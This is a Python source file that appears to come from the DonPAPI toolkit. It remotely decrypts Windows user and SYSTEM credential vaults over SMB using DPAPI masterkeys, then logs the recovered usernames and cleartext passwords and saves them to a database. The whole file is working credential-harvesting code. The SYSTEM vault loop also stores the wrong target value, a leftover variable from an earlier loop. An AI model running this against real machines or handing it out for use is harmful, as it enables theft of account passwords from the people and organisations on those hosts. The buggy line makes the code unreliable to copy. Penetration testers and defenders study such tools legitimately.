from typing import Any

from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection
from dploot.triage.vaults import VaultsTriage
from donpapi.core import DonPAPICore
from donpapi.lib.logger import DonPAPIAdapter


TAG = "Vaults"

class VaultsDump:
    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list, options: Any, logger: DonPAPIAdapter, context: DonPAPICore) -> None:
        self.target = target
        self.conn = conn
        self.masterkeys = masterkeys
        self.options = options
        self.logger = logger
        self.context = context

    def run(self):
        self.logger.display(f"Dumping User{' and Machine' if self.context.remoteops_allowed else ''} Vaults")
        vaults_triage = VaultsTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys)
        vaults = vaults_triage.triage_vaults()
        
        for vault in vaults:
            if vault.type == "Internet Explorer":
                resource = vault.resource + " -" if vault.resource != "" else "-"
                self.logger.secret(f"[{vault.winuser}] {resource} - {vault.username}:{vault.password}", vault.type.upper())
                self.context.db.add_secret(
                    computer=self.context.host,
                    collector=TAG,
                    windows_user=vault.winuser,
                    username=vault.username,
                    password=vault.password,
                    program=vault.type,
                    target=vault.resource,
                    )
        if self.context.remoteops_allowed:
            system_vaults = vaults_triage.triage_system_vaults()
            for vault in system_vaults:
                self.logger.secret(f"[SYSTEM] {vault.resource} {vault.username}:{vault.password}", TAG)
                self.context.db.add_secret(
                    computer=self.context.host,
                    collector=TAG,
                    windows_user="SYSTEM",
                    username=vault.username,
                    password=vault.password,
                    program=vault.type,
                    target=resource
                    )